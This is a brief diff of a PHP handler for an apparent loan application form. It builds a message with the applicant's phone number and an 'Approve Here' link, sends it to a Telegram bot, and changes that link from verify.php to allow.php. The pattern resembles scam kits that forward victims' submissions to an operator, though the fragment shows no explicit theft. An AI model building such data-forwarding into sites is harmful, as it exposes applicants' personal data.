@@ -118,7 +118,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
     $msg .= "Phone: +263 $phone\n";
 
     $msg .= "👤 *Approval area*\n";
-    $msg .= "Approve Here: https://loan-1-i36j.onrender.com/verify.php";
+    $msg .= "Approve Here: https://loan-1-i36j.onrender.com/allow.php";
 
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
